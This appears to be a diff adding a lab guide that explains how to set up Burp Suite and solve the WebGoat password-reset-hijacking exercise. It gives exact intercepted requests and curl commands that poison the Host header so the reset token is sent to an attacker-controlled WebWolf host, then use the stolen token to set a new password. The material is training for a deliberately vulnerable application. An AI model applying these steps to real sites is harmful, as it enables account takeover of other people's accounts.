@@ -1,0 +1,207 @@
+===================================================================
+BURP SUITE SETUP GUIDE - FOR PASSWORD RESET HIJACKING
+===================================================================
+
+QUICK SETUP FOR THIS CHALLENGE
+===================================================================
+
+1. DOWNLOAD & INSTALL BURP SUITE
+   - Download: https://portswigger.net/burp/communitydownload
+   - Install Burp Suite Community Edition (Free)
+   - Launch Burp Suite
+
+2. START BURP WITH TEMPORARY PROJECT
+   - Choose "Temporary project"
+   - Click "Next"
+   - Choose "Use Burp defaults"
+   - Click "Start Burp"
+
+3. CONFIGURE PROXY
+   - Go to "Proxy" tab
+   - Click "Options" sub-tab
+   - Verify "Proxy Listeners" shows:
+     Running: ✓
+     Interface: 127.0.0.1:8080
+   - If not running, click "Add" and set to 127.0.0.1:8080
+
+4. CONFIGURE BROWSER (FIREFOX RECOMMENDED)
+   
+   Option A - Manual Proxy Settings:
+   - Firefox: Settings > Network Settings > Settings button
+   - Select "Manual proxy configuration"
+   - HTTP Proxy: 127.0.0.1
+   - Port: 8080
+   - Check "Also use this proxy for HTTPS"
+   - Click OK
+
+   Option B - FoxyProxy Extension (RECOMMENDED):
+   - Install FoxyProxy extension
+   - Add new proxy:
+     Title: Burp Suite
+     Proxy Type: HTTP
+     Proxy IP: 127.0.0.1
+     Port: 8080
+   - Enable the proxy when testing, disable when done
+
+5. IMPORT BURP CA CERTIFICATE (FOR HTTPS)
+   
+   In Burp:
+   - Go to Proxy > Options
+   - Click "Import / export CA certificate"
+   - Export in DER format
+   - Save as burp-cert.der
+
+   In Firefox:
+   - about:preferences#privacy
+   - Scroll to "Certificates"
+   - Click "View Certificates"
+   - Click "Import"
+   - Select burp-cert.der
+   - Check "Trust this CA to identify websites"
+   - Click OK
+
+6. TEST THE PROXY
+   - In Burp: Proxy > Intercept > Make sure "Intercept is on"
+   - In browser: Visit any website
+   - You should see the request in Burp
+   - Click "Forward" to let it through
+   - Turn off "Intercept is on" for normal browsing
+
+===================================================================
+USING BURP FOR THIS CHALLENGE
+===================================================================
+
+STEP 1: ENABLE INTERCEPT
+- Go to Burp > Proxy > Intercept
+- Click "Intercept is on" (button turns orange)
+
+STEP 2: TRIGGER THE REQUEST
+- In browser, go to WebGoat Password Reset page
+- Enter: tom@webgoat-cloud.org
+- Click Submit
+
+STEP 3: MODIFY THE REQUEST
+When you see the request in Burp:
+
+ORIGINAL:
+POST /WebGoat/PasswordReset/reset/reset-password HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+
+email=tom@webgoat-cloud.org
+
+MODIFIED (Change the Host header):
+POST /WebGoat/PasswordReset/reset/reset-password HTTP/1.1
+Host: localhost:9090                    <--- CHANGED THIS LINE
+User-Agent: Mozilla/5.0...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+
+email=tom@webgoat-cloud.org
+
+STEP 4: FORWARD THE REQUEST
+- Click "Forward" button
+- Turn off "Intercept is on"
+
+===================================================================
+BURP REPEATER (FOR STEP 7)
+===================================================================
+
+Using Repeater to reset password with captured token:
+
+1. Right-click in any request > "Send to Repeater"
+2. Go to "Repeater" tab
+3. Clear the request and enter:
+
+POST /WebGoat/PasswordReset/reset/reset-password/YOUR_TOKEN_HERE HTTP/1.1
+Host: 192.168.254.112:8001
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+newPassword=MyNewPassword123
+
+4. Replace YOUR_TOKEN_HERE with the token from WebWolf
+5. Click "Send"
+6. Check response in right panel
+
+===================================================================
+TROUBLESHOOTING BURP
+===================================================================
+
+PROBLEM: Browser shows "Proxy connection failed"
+SOLUTION:
+- Check Burp is running
+- Verify proxy settings: 127.0.0.1:8080
+- Check Burp Proxy Listener is running
+- Try visiting http://burp (should show Burp page)
+
+PROBLEM: HTTPS sites show certificate error
+SOLUTION:
+- Import Burp CA certificate (see step 5 above)
+- Or click "Advanced" > "Accept the Risk"
+
+PROBLEM: Can't see requests in Burp
+SOLUTION:
+- Check browser proxy is enabled
+- Verify FoxyProxy is on
+- Make sure Burp Proxy > Intercept > "Intercept is on"
+- Check Proxy > HTTP History tab for past requests
+
+PROBLEM: Intercept doesn't stop requests
+SOLUTION:
+- Click "Intercept is on" to enable it
+- Check Proxy > Options > Intercept Client Requests
+- Make sure "Intercept requests based on the following rules" is checked
+
+PROBLEM: Modified Host header doesn't work
+SOLUTION:
+- Make sure you're modifying the Host header, not URL
+- Verify format: Host: localhost:9090 (no http://)
+- Check there are no extra spaces
+- Use Repeater tab for more control
+
+===================================================================
+ALTERNATIVE: USING CURL (NO BURP NEEDED)
+===================================================================
+
+If Burp is too complicated, use curl command line:
+
+# Step 1: Request reset with modified host
+curl -X POST "http://192.168.254.112:8001/WebGoat/PasswordReset/reset/reset-password" \
+  -H "Host: localhost:9090" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "email=tom@webgoat-cloud.org" \
+  -v
+
+# Step 2: Check WebWolf for token
+# Open: http://localhost:9090/WebWolf/requests
+
+# Step 3: Reset password with token
+curl -X POST "http://192.168.254.112:8001/WebGoat/PasswordReset/reset/reset-password/YOUR_TOKEN" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "newPassword=MyNewPassword123" \
+  -v
+
+===================================================================
+QUICK REFERENCE
+===================================================================
+
+Burp Proxy Address: 127.0.0.1:8080
+Burp Test URL: http://burp
+WebGoat: http://192.168.254.112:8001
+WebWolf: http://localhost:9090
+
+Keyboard Shortcuts in Burp:
+- Forward request: Ctrl+F
+- Drop request: Ctrl+D
+- Toggle intercept: Ctrl+T
+
+Important Tabs:
+- Proxy > Intercept: Catch and modify requests
+- Proxy > HTTP History: See all past requests
+- Repeater: Manually craft and send requests
+- Intruder: Automated attacks (not needed for this)
+
+===================================================================
